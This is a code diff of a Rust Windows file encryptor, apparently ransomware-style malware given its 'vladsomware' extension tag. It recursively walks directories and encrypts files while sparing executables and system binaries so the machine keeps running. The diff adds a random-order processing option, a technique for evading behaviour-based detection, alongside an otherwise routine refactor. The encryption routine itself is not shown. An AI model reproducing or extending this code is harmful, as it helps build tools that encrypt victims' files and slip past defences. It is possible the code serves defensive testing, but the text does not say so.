@@ -1,8 +1,8 @@
-use crate::directory_enumerator::{enumerate_dir_entries, name_from_find};
+use crate::directory_enumerator::{enumerate_dir_entries, name_from_find_data, FindData};
 use crate::progress::Progress;
 use spdlog::{debug, error, info, warn};
 use std::cmp::PartialEq;
-use std::collections::LinkedList;
+use std::collections::{HashSet, LinkedList};
 use std::ffi::{c_void, OsStr, OsString};
 use std::fs;
 use std::fs::File;
@@ -10,8 +10,9 @@ use std::io::{BufReader, BufWriter, Read, Write};
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, Condvar, Mutex};
 use std::thread::{self, JoinHandle};
-use windows::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_DIRECTORY, WIN32_FIND_DATAW};
-use windows::{core::*, Win32::Security::Cryptography::*};
+use windows::{
+    core::*, Win32::Security::Cryptography::*, Win32::Storage::FileSystem::FILE_ATTRIBUTE_DIRECTORY,
+};
 
 #[derive(PartialEq)]
 pub(crate) enum EncryptionMode {
@@ -58,6 +59,7 @@ struct InnerEncryptor {
     encryption_extension: OsString,
     encryption_mode: EncryptionMode,
     recursive: bool,
+    random_order: bool,
     whitelisted_extensions: Vec<OsString>,
 }
 
@@ -72,9 +74,12 @@ impl InnerEncryptor {
             encryption_extension: OsString::from("vladsomware"),
             encryption_mode: EncryptionMode::Encrypt,
             recursive: false,
-            whitelisted_extensions: vec![OsString::from("exe"),
-                                        OsString::from("dll"),
-                                        OsString::from("bin")],
+            random_order: false,
+            whitelisted_extensions: vec![
+                OsString::from("exe"),
+                OsString::from("dll"),
+                OsString::from("bin"),
+            ],
         })
     }
 
@@ -208,16 +213,17 @@ impl InnerEncryptor {
         }
     }
 
-    fn is_directory(&self, fd: &WIN32_FIND_DATAW) -> bool {
-        fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0 != 0
+    fn is_directory(&self, fd: &FindData) -> bool {
+        fd.0.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0 != 0
     }
 
     fn eq_ignore_ascii_case_os(a: &OsStr, b: &OsStr) -> bool {
-        a.to_string_lossy().eq_ignore_ascii_case(&b.to_string_lossy())
+        a.to_string_lossy()
+            .eq_ignore_ascii_case(&b.to_string_lossy())
     }
 
-    fn should_skip_dir_entry(&self, fd: &WIN32_FIND_DATAW) -> bool {
-        let file_name = name_from_find(fd); // OsString
+    fn should_skip_dir_entry(&self, fd: &FindData) -> bool {
+        let file_name = name_from_find_data(fd); // OsString
         if file_name == OsStr::new(".") || file_name == OsStr::new("..") {
             return true;
         }
@@ -226,7 +232,7 @@ impl InnerEncryptor {
             return false;
         }
 
-        let ext = Path::new(&file_name).extension();               // Option<&OsStr>
+        let ext = Path::new(&file_name).extension(); // Option<&OsStr>
         for ext_to_whitelist in self.whitelisted_extensions.iter() {
             if Self::eq_ignore_ascii_case_os(ext_to_whitelist, ext.unwrap()) {
                 return true;
@@ -235,8 +241,8 @@ impl InnerEncryptor {
         let matches = ext == Some(self.encryption_extension.as_os_str());
 
         match self.encryption_mode {
-            EncryptionMode::Encrypt => matches,   // skip files already encrypted
-            EncryptionMode::Decrypt => !matches,  // skip files not having the tag (including None)
+            EncryptionMode::Encrypt => matches, // skip files already encrypted
+            EncryptionMode::Decrypt => !matches, // skip files not having the tag (including None)
         }
     }
 
@@ -452,19 +458,13 @@ impl InnerEncryptor {
         Ok(())
     }
 
-    fn act_on_dir_entry(
-        &mut self,
-        dir: &Path,
-        fd: &WIN32_FIND_DATAW,
-        depth: i32,
-        progress: &Progress,
-    ) {
+    fn act_on_dir_entry(&mut self, dir: &Path, fd: &FindData, depth: i32, progress: &Progress) {
         debug!("processing {}", dir.display());
         if self.should_skip_dir_entry(&fd) {
             return;
         }
         let mut fp = dir.to_owned();
-        fp.push(name_from_find(fd));
+        fp.push(name_from_find_data(fd));
         if self.recursive && self.is_directory(&fd) {
             self.act_on_dir(&fp, depth + 1, &progress);
         } else {
@@ -491,23 +491,37 @@ impl InnerEncryptor {
         }
         let mut search_pattern = dir.to_owned();
         search_pattern.push("*");
-        let _result = enumerate_dir_entries(search_pattern, |fd| {
-            self.act_on_dir_entry(dir, fd, depth, progress)
-        })
-        .map_err(|e| {
-            error!("Error enumerating directory entries: {}", e);
-        });
+        if !self.random_order {
+            let _result = enumerate_dir_entries(search_pattern, |fd| {
+                self.act_on_dir_entry(dir, fd, depth, progress)
+            })
+            .map_err(|e| {
+                error!("Error enumerating directory entries: {}", e);
+            });
+        } else {
+            let mut found_data_set: HashSet<FindData> = HashSet::new();
+            let _result = enumerate_dir_entries(search_pattern, |fd| {
+                found_data_set.insert(fd.clone());
+            }).map_err(|e| {
+                error!("Error enumerating directory entries: {}", e);
+            });
+            if _result.is_ok() {
+                for fd in found_data_set {
+                    self.act_on_dir_entry(dir, &fd, depth, progress);
+                }
+            }
+        }
     }
-    fn compute_entry_size(&mut self, dir: &Path, fd: &WIN32_FIND_DATAW, depth: i32) -> u64 {
+    fn compute_entry_size(&mut self, dir: &Path, fd: &FindData, depth: i32) -> u64 {
         if self.should_skip_dir_entry(&fd) {
             return 0;
         }
         let mut fp = dir.to_owned();
-        fp.push(name_from_find(&fd));
-        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0) != 0) && self.recursive {
+        fp.push(name_from_find_data(&fd));
+        if ((fd.0.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY.0) != 0) && self.recursive {
             self.compute_dir_size(&fp, depth + 1)
         } else {
-            ((fd.nFileSizeHigh as u64) << 32) | (fd.nFileSizeLow as u64)
+            ((fd.0.nFileSizeHigh as u64) << 32) | (fd.0.nFileSizeLow as u64)
         }
     }
     fn compute_dir_size(&mut self, dir: &Path, depth: i32) -> u64 {
@@ -662,6 +676,10 @@ impl Encryptor {
 
     pub(crate) fn set_recursive(&mut self, recursive: bool) {
         self.post(move |enc| enc.recursive = recursive.clone())
+    }
+
+    pub(crate) fn set_random_order(&mut self, random_order: bool) {
+        self.post(move |enc| enc.random_order = random_order.clone())
     }
 
     pub(crate) fn encrypt_dir(&mut self, dir_path: &PathBuf) -> Arc<Progress> {
